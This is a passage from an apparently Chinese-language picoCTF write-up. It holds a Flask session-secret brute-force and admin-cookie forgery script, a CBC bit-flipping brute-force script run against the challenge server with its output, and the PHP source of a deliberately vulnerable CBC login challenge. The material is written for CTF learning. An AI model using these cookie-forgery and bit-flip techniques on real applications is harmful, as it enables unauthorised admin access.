ZANNI&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&#x27;sub-command help&#x27;</span>, dest=<span class="string">&#x27;subcommand&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">&#x27;encode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;encode&#x27;</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--cookie-structure&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie structure&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">&#x27;decode&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--secret-key&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Secret key&#x27;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cookie-value&#x27;</span>, metavar=<span class="string">&#x27;&lt;string&gt;&#x27;</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">&#x27;Session cookie value&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="comment">##test</span></span><br><span class="line">    aim=<span class="string">&quot;eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkAKOg.NwOodx1E0kNm0ZuAEwOPXdUTXzU&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(FSCM.decode(aim))</span><br><span class="line">    cookie_names = [<span class="string">&quot;snickerdoodle&quot;</span>, <span class="string">&quot;chocolate chip&quot;</span>, <span class="string">&quot;oatmeal raisin&quot;</span>, <span class="string">&quot;gingersnap&quot;</span>, <span class="string">&quot;shortbread&quot;</span>, <span class="string">&quot;peanut butter&quot;</span>, <span class="string">&quot;whoopie pie&quot;</span>, <span class="string">&quot;sugar&quot;</span>, <span class="string">&quot;molasses&quot;</span>, <span class="string">&quot;kiss&quot;</span>, <span class="string">&quot;biscotti&quot;</span>, <span class="string">&quot;butter&quot;</span>, <span class="string">&quot;spritz&quot;</span>, <span class="string">&quot;snowball&quot;</span>, <span class="string">&quot;drop&quot;</span>, <span class="string">&quot;thumbprint&quot;</span>, <span class="string">&quot;pinwheel&quot;</span>, <span class="string">&quot;wafer&quot;</span>, <span class="string">&quot;macaroon&quot;</span>, <span class="string">&quot;fortune&quot;</span>, <span class="string">&quot;crinkle&quot;</span>, <span class="string">&quot;icebox&quot;</span>, <span class="string">&quot;gingerbread&quot;</span>, <span class="string">&quot;tassie&quot;</span>, <span class="string">&quot;lebkuchen&quot;</span>, <span class="string">&quot;macaron&quot;</span>, <span class="string">&quot;black and white&quot;</span>, <span class="string">&quot;white chocolate macadamia&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> ck <span class="keyword">in</span> cookie_names:</span><br><span class="line">        <span class="comment">##print(ck)</span></span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&#x27;/root/Desktop/task/1.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        py=<span class="string">&#x27;&#123;&quot;very_auth&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br><span class="line">        test= FSCM.encode(ck,py)</span><br><span class="line">        <span class="comment">#print(FSCM.decode(test))</span></span><br><span class="line">        f.write(test+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(ck+<span class="string">&#x27;  &#x27;</span>+test)</span><br><span class="line">        <span class="keyword">if</span> test==aim:</span><br><span class="line">            <span class="built_in">print</span>(ck)</span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">&#x27;encode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">&#x27;decode&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆破获得密钥<br>构造payload：<code>&#39;&#123;&quot;very_auth&quot;:&quot;admin&quot;&#125;&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET /display HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: mercury.picoctf.net:65344</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://mercury.picoctf.net:65344/</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YkGS_w.pHefYOy1L_8ZAK0IlteWzQttBhc</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;jumbotron&quot;&gt;</span><br><span class="line">     &lt;p class=&quot;lead&quot;&gt;&lt;/p&gt;</span><br><span class="line">     &lt;p style=&quot;text-align:center; font-size:30px;&quot;&gt;</span><br><span class="line">     &lt;b&gt;Flag&lt;/b&gt;: &lt;code&gt;</span><br><span class="line">     picoCTF&#123;pwn_4ll_th3_cook1E5_25bdb6f6&#125;</span><br><span class="line">     &lt;/code&gt;&lt;/p&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2 id="More-COOKIE"><a href="#More-COOKIE" class="headerlink" title="More_COOKIE"></a>More_COOKIE</h2><p>没有提供源码。<br>burp抓包得到cookie信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name=-1; session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkGPoA.LOouJ_MDhpAP-qA8p1gOhTi0dUw; auth_name=QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=</span><br></pre></td></tr></table></figure>
<p>由于没有secret_key,所以暂时不考虑flasksession的可能。<br>base解码auth_name得到加密后的密文<br>没有什么头绪，但cookie可能存在cbc字节翻转攻击。<br>在已知第一组密文和第二组明文的情况下，将二者和目标字符异或后可以任意改变目标字符。<br>本题条件：</p>
<ol>
<li>组大小未知</li>
<li>vi初始向量未知</li>
<li>已知明文为admin=<code>0</code>，位置未知。</li>
<li>目标字符<code>1</code>未知位置</li>
<li>密文已知</li>
<li>正确的偏移量可以通过服务器的解析而不是500错误<br>尝试从1~10的所有字符和0~96异或,从而让目标值翻转。<br>解题脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bit flip code based on https://crypto.stackexchange.com/a/66086.</span></span><br><span class="line"><span class="comment"># we need to decode from base64 twice because the cookie was encoded twice.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_flip</span>(<span class="params">pos, bit, data</span>):</span></span><br><span class="line">    raw = b64decode(b64decode(data).decode())</span><br><span class="line">    list1 = <span class="built_in">bytearray</span>(raw)</span><br><span class="line">    list1[pos] = list1[pos] ^ bit</span><br><span class="line">    raw = <span class="built_in">bytes</span>(list1)</span><br><span class="line">    <span class="keyword">return</span> b64encode(b64encode(raw)).decode()</span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;QnZkTU9DdjB1NWtDMmJUdDBKSTJRTzFSdFBSMUpzVUx3UitrcnZEbjFYcHdPSGF3UHVrbGFWb0w5MlZZRU9vUWRkdG5USDcwdmZzWFhYcXVxOEQyelBJc3NCT2ZnVlhUSXM2RGRNMlR2cjRRVUFwaldtakZQTUNGcmtoSGpIN1U=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> position_idx <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">10</span>), desc=<span class="string">&quot;Bruteforcing Position&quot;</span>):</span><br><span class="line"><span class="comment">#def position(position_idx):</span></span><br><span class="line">    <span class="comment"># The 96 really should be 128 to test every bit, but 96 worked for me.</span></span><br><span class="line">    <span class="keyword">for</span> bit_idx <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">96</span>), desc=<span class="string">&quot;%i Bruteforcing Bit&quot;</span>%position_idx):</span><br><span class="line">        auth_cookie = bit_flip(position_idx, bit_idx, cookie)</span><br><span class="line">        cookies = &#123;<span class="string">&#x27;auth_name&#x27;</span>: auth_cookie&#125;</span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://mercury.picoctf.net:10868/&#x27;</span>, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;picoCTF&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># The flag is between `&lt;code&gt;` and `&lt;/code&gt;`</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span> + r.text.split(<span class="string">&quot;&lt;code&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/code&gt;&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#Pool().map(position,range(10))</span></span><br></pre></td></tr></table></figure>
<p>尝试使用进程池失败，<br>脚本输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:06&lt;00:00,  1.45it/s]</span><br><span class="line">1 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.36it/s]</span><br><span class="line">2 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:06&lt;00:00,  1.44it/s]</span><br><span class="line">3 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.37it/s]</span><br><span class="line">4 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:11&lt;00:00,  1.34it/s]</span><br><span class="line">5 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.35it/s]</span><br><span class="line">6 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.37it/s]</span><br><span class="line">7 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:10&lt;00:00,  1.35it/s]</span><br><span class="line">8 Bruteforcing Bit: 100%|███████████████████████████████████████| 96/96 [01:07&lt;00:00,  1.41it/s]</span><br><span class="line">Bruteforcing Position:  90%|█████████████████████████████████▎   | 9/10 [10:24&lt;01:09, 69.63s/itFlag: picoCTF&#123;cO0ki3s_yum_e57b2438&#125;                               | 1/96 [00:00&lt;01:06,  1.43it/s]</span><br><span class="line">9 Bruteforcing Bit:   1%|▍                                       | 1/96 [00:02&lt;03:32,  2.24s/it]</span><br><span class="line">Bruteforcing Position: 100%|████████████████████████████████████| 10/10 [10:27&lt;00:00, 62.72s/it]</span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="CBC字节反转攻击"><a href="#CBC字节反转攻击" class="headerlink" title="CBC字节反转攻击"></a>CBC字节反转攻击</h2><p>源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login Form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;static/css/style.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.username&quot;</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.user-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.username&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.user-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.password&quot;</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.pass-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">	$(<span class="string">&quot;.password&quot;</span>).blur(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		$(<span class="string">&quot;.pass-icon&quot;</span>).css(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span></span><br><span class="line"><span class="javascript">	&#125;);</span></span><br><span class="line"><span class="javascript">&#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, &#x27;9999999999999999&#x27;);</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&#x27;cipher&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;iv&#x27;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&#x27;cipher&#x27;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;<span class="tag">&lt;<span class="name">p</span>&gt;</span>base64_decode(&#x27;&quot;.base64_encode($plain).&quot;&#x27;) can&#x27;t unserialize<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&quot;);</span><br><span class="line">            $_SESSION[&#x27;username&#x27;] = $info[&#x27;username&#x27;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&#x27;admin&#x27;)&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Flag is ctf&#123;123cbcchange&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>hello &#x27;.$_SESSION[&#x27;username&#x27;].&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>Only admin can see flag<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;loginout.php&quot;</span>&gt;</span>Log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = (string)$_POST[&#x27;password&#x27;];</span><br><span class="line">    if($username === &#x27;admin&#x27;)&#123;</span><br><span class="line">        exit(&#x27;<span class="tag">&lt;<span class="name">p</span>&gt;</span>admin are not allowed to login<span class="tag">&lt;/<span class="name">p</span>&gt;</span>&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&#x27;username&#x27;=&gt;$username,&#x27;password&#x27;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;<span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;login-body&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wrapper&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;user-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pass-icon&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">class</span>=<span class="string">&quot;login-form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span>&gt;</span>Fill out the form below to login to my super awesome imaginary control panel.<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;this.value=\&#x27;\&#x27;&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;this.value=\&#x27;\&#x27;&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">body</span>&gt;</span>&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
